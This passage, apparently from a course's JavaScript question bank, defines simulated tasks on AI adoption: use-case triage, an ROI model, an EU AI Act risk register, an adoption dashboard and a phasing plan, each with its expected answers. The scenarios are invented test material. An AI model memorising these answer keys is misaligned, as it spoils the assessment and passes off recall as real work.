              ['1', 'Repairs triage', '3,000/month', 'Tenants report repairs by phone, web and email. Logging and prioritising takes 6 min each. Data in the housing system; API available.'],
              ['2', 'Tenant letters', '1,200/month', 'Standard letters drafted from templates, 10 min each; officer signs.'],
              ['3', 'Arrears prediction', '9,000 tenancies', 'Payment history patchy before 2024; affects vulnerable tenants.'],
              ['4', 'Board report summaries', '12/year', 'Directors summarise papers; 2 hours each.'],
              ['5', 'Automated eviction notices', '40/month', 'Proposal to send notices automatically when arrears pass a threshold.'],
              ['6', 'Call transcripts for QA', '8,000 calls/month', 'Supervisors listen to 2% of calls; phone system has transcription built in, unused.'],
            ],
            'U'
          ),
          recordFields: [
            { key: 'hours', label: 'Staff hours a month today (whole number; 0 if not time-based)', type: 'number' },
            { key: 'decision', label: 'Decision', type: 'select', options: ['Pilot now', 'Later, after data work', 'Quick win with existing tools', 'Don’t pursue'] },
          ],
        }),
        [
          ['Repairs: 300 hours a month', 'records.U1.hours', '300'],
          ['Repairs: pilot now', 'records.U1.decision', 'Pilot now'],
          ['Letters: 200 hours a month', 'records.U2.hours', '200'],
          ['Arrears: later, after data work', 'records.U3.decision', 'Later, after data work'],
          ['Board summaries: 2 hours a month', 'records.U4.hours', '2'],
          ['Eviction notices: don’t pursue', 'records.U5.decision', 'Don’t pursue'],
          ['Transcripts: quick win with existing tools', 'records.U6.decision', 'Quick win with existing tools'],
        ],
        { minutes: 12 }
      ),
      short('m-sim-uc-2', 'Why Not Evictions?', 'In a few words, why not automate eviction notices?', ['high risk to tenants', 'automated decision', 'needs human judgement', 'legal risk', 'affects vulnerable people', 'harm to tenants', 'unlawful'], { taskId: 'm-sim-uc-1', minutes: 2 }),
    ],
  },

  'test-roi-01': {
    aspect: { id: 'sim', name: 'Hands-on: ROI Model', summary: 'Building a business case and testing its downside.' },
    questions: [
      simTask(
        'm-sim-roi-1',
        'Model the Business Case',
        `Model the recruitment agency's case: 20 consultants, £40 per consultant per month, £6,000 set-up and training, 3 hours saved a week, 70% adoption, time valued at £30/hour, 46 working weeks.

Enter it, press Calculate, and record the results. Then work out the downside: half the time saving and 50% adoption.`,
        'ROI model',
        labApp({
          title: 'ROI model',
          subtitle: 'AI drafting tool · first year',
          brief: 'Cost = users × licence × 12 + one-off costs. Benefit = users × adoption × hours a week × weeks × value per hour.',
          runLabel: 'Calculate',
          params: [
            { key: 'users', label: 'Users', type: 'number' },
            { key: 'licence', label: 'Licence (£ per user per month)', type: 'number' },
            { key: 'oneoff', label: 'Set-up and training (£)', type: 'number' },
            { key: 'hours', label: 'Hours saved per user per week', type: 'number' },
            { key: 'adoption', label: 'Adoption (%)', type: 'number' },
            { key: 'value', label: 'Value of an hour (£)', type: 'number' },
            { key: 'weeks', label: 'Working weeks', type: 'number' },
          ],
          defaults: { users: 0, licence: 0, oneoff: 0, hours: 0, adoption: 100, value: 0, weeks: 52 },
          compute: String.raw`
var u=+p.users||0,c=u*(+p.licence||0)*12+(+p.oneoff||0),b=u*((+p.adoption||0)/100)*(+p.hours||0)*(+p.weeks||0)*(+p.value||0);
var roi=c?((b-c)/c*100):0,pay=b?c/(b/12):0;
return {kpis:[['Cost','£'+Math.round(c).toLocaleString('en-GB')],['Benefit','£'+Math.round(b).toLocaleString('en-GB')],['ROI',Math.round(roi)+'%'],['Payback',pay?pay.toFixed(1)+' months':'—']],results:{cost:Math.round(c),benefit:Math.round(b),roi:Math.round(roi)}};`,
          answers: [
            { key: 'cost', label: 'Base case: first-year cost (£)', type: 'number' },
            { key: 'benefit', label: 'Base case: benefit (£)', type: 'number' },
            { key: 'downside', label: 'Downside: benefit (£)', type: 'number' },
            { key: 'pays', label: 'Does the downside still pay for itself?', type: 'select', options: ['Yes', 'No'] },
          ],
        }),
        [
          ['Base-case cost £15,600', 'answers.cost', '15600'],
          ['Base-case benefit £57,960', 'answers.benefit', '57960'],
          ['Downside benefit £20,700', 'answers.downside', '20700'],
          ['The downside still pays', 'answers.pays', 'Yes'],
        ],
        { minutes: 12 }
      ),
      short('m-sim-roi-2', 'Downside ROI', 'What is the downside ROI, as a whole %? (Net benefit divided by cost.)', ['33%', '33', '32.7%', '32.7', '33 %'], { taskId: 'm-sim-roi-1', minutes: 2 }),
    ],
  },

  'test-airisk-01': {
    aspect: { id: 'sim', name: 'Hands-on: Risk Register', summary: 'Classifying proposals and picking the control that matters.' },
    questions: [
      simTask(
        'm-sim-rk-1',
        'Fill the Risk Register',
        'Six AI proposals from a UK retailer that also sells into the EU. For each, choose the EU AI Act tier and the key control.',
        'AI risk register',
        queueApp({
          title: 'AI risk register',
          subtitle: 'Northwind Retail · UK and EU',
          columns: ['#', 'Proposal'],
          records: r(
            [
              ['1', '1', 'Website chatbot for product questions', 'Customers in the UK and EU chat with an AI assistant about products.'],
              ['2', '2', 'CV screening for store staff in Germany', 'AI ranks applicants for store roles in Germany and suggests who to interview.'],
              ['3', '3', 'Spam filter on the support inbox', 'Filters junk email.'],
              ['4', '4', 'AI-written product images for ads', 'Generates lifestyle images for EU ad campaigns.'],
              ['5', '5', 'Emotion detection on store CCTV for staff', 'Detects staff emotions at work to manage performance.'],
              ['6', '6', 'Demand forecasting', 'Forecasts stock levels from sales history; no personal data.'],
            ],
            'P'
          ),
          recordFields: [
            { key: 'tier', label: 'EU AI Act tier', type: 'select', options: ['Prohibited', 'High-risk', 'Limited risk (transparency)', 'Minimal risk'] },
            { key: 'control', label: 'Key control', type: 'select', options: ['Tell people they’re talking to AI', 'Human oversight, bias testing, DPIA and documentation', 'Don’t deploy', 'Label AI-generated content and check rights', 'Normal good practice'] },
          ],
        }),
        [
          ['1: limited risk', 'records.P1.tier', 'Limited risk (transparency)'],
          ['1: tell people it’s AI', 'records.P1.control', 'Tell people they’re talking to AI'],
          ['2: high-risk', 'records.P2.tier', 'High-risk'],
          ['2: human oversight, bias testing, DPIA', 'records.P2.control', 'Human oversight, bias testing, DPIA and documentation'],
          ['3: minimal risk', 'records.P3.tier', 'Minimal risk'],
          ['4: label and check rights', 'records.P4.control', 'Label AI-generated content and check rights'],
          ['5: prohibited (emotion recognition at work)', 'records.P5.tier', 'Prohibited'],
          ['5: don’t deploy', 'records.P5.control', 'Don’t deploy'],
          ['6: minimal risk', 'records.P6.tier', 'Minimal risk'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-rk-2', 'Assessment Needed', 'Which data protection assessment does proposal 2 need? (Abbreviation.)', ['DPIA'], { taskId: 'm-sim-rk-1', minutes: 2 }),
    ],
  },

  'test-aichange-01': {
    aspect: { id: 'sim', name: 'Hands-on: Adoption Dashboard', summary: 'Reading adoption data and choosing the fix for each team.' },
    questions: [
      simTask(
        'm-sim-ch-1',
        'Fix the Rollout by Team',
        'Three months into an AI assistant rollout. Open each team’s figures and survey comments, work out its weekly active rate, and choose the action that will help most.',
        'Adoption dashboard',
        queueApp({
          title: 'Adoption dashboard',
          subtitle: 'Insurance broker · 150 licences · month 3',
          columns: ['Team', 'Licences / weekly users'],
          records: r(
            [
              ['1', 'Claims', '40 / 32', 'Survey: "Saves me an hour a day on letters." Champions in place.'],
              ['2', 'Finance', '20 / 2', 'Survey: "Not allowed to put client data in it?" No data guidance issued.'],
              ['3', 'Sales', '50 / 10', 'Survey: "Don’t see how it helps with my calls." Training was one launch-day webinar.'],
              ['4', 'Underwriting', '40 / 6', 'Survey: "Is this to replace us?" Rumours of cuts; no message from leadership.'],
            ],
            'T'
          ),
          recordFields: [
            { key: 'rate', label: 'Weekly active rate (%)', type: 'number' },
            { key: 'action', label: 'Action', type: 'select', options: ['Keep going; share their examples', 'Issue clear data guidance', 'Hands-on training on their own tasks', 'Honest message from leadership about jobs', 'Remove their licences'] },
          ],
        }),
        [
          ['Claims 80%', 'records.T1.rate', '80'],
          ['Claims: keep going and share', 'records.T1.action', 'Keep going; share their examples'],
          ['Finance 10%', 'records.T2.rate', '10'],
          ['Finance: data guidance', 'records.T2.action', 'Issue clear data guidance'],
          ['Sales 20%', 'records.T3.rate', '20'],
          ['Sales: hands-on training', 'records.T3.action', 'Hands-on training on their own tasks'],
          ['Underwriting 15%', 'records.T4.rate', '15'],
          ['Underwriting: honest message', 'records.T4.action', 'Honest message from leadership about jobs'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-ch-2', 'Overall Rate', 'What is the overall weekly active rate across all 150 licences? (As a %.)', ['33.3%', '33.3', '33%', '33'], { taskId: 'm-sim-ch-1', minutes: 2 }),
    ],
  },

  'test-sim-aic-01': {
    aspect: { id: 'sim', name: 'Hands-on: Greenfield Plan', summary: 'Sizing the tasks and phasing the plan.' },
    questions: [
      simTask(
        'm-sim-aics-1',
        'Plan Greenfield’s Year',
        'Greenfield Lettings’ six candidate tasks from discovery. For each, enter today’s staff hours a month and choose its phase. Keep phase 1 to the two tasks with the clearest, lowest-risk payback.',
        'Planning board: Greenfield Lettings',
        queueApp({
          title: 'Planning board',
          subtitle: 'Greenfield Lettings · 28 staff · £40k budget',
          columns: ['Task', 'Volume'],
          records: r(
            [
              ['1', 'Maintenance requests', '900/month', 'Logged by staff, 6 min each, then chased. Lettings platform has an API.'],
              ['2', 'Property listings', '60/month', 'Descriptions take 40 min each.'],
              ['3', 'Tenant referencing', '70/month', '90 min each; decides who gets a home.'],
              ['4', 'Landlord statements', '600/month', 'Already produced automatically by the lettings software.'],
              ['5', 'Viewing bookings', '500/month', 'Mostly phone; 30% of after-hours calls unanswered. 4 min each.'],
              ['6', 'Tenant rejection letters', '30/month', 'Proposal: AI decides and sends rejections automatically.'],
            ],
            'G'
          ),
          recordFields: [
            { key: 'hours', label: 'Staff hours a month today (0 if automated)', type: 'number' },
            { key: 'phase', label: 'Phase', type: 'select', options: ['Phase 1 (months 1–3)', 'Phase 2 (months 4–6)', 'Phase 3, with safeguards', 'Leave as is', 'Don’t do'] },
          ],
        }),
        [
          ['Maintenance: 90 hours', 'records.G1.hours', '90'],
          ['Maintenance: phase 1', 'records.G1.phase', 'Phase 1 (months 1–3)'],
          ['Listings: 40 hours', 'records.G2.hours', '40'],
          ['Listings: phase 2', 'records.G2.phase', 'Phase 2 (months 4–6)'],
          ['Referencing: phase 3 with safeguards', 'records.G3.phase', 'Phase 3, with safeguards'],
          ['Statements: leave as is', 'records.G4.phase', 'Leave as is'],
          ['Viewings: phase 1', 'records.G5.phase', 'Phase 1 (months 1–3)'],
          ['Automated rejections: don’t do', 'records.G6.phase', 'Don’t do'],
        ],
        { minutes: 12 }
      ),
      short('m-sim-aics-2', 'Referencing Hours', 'How many staff hours a month does referencing take today?', ['105', '105 hours'], { taskId: 'm-sim-aics-1', minutes: 2 }),
    ],
  },
};
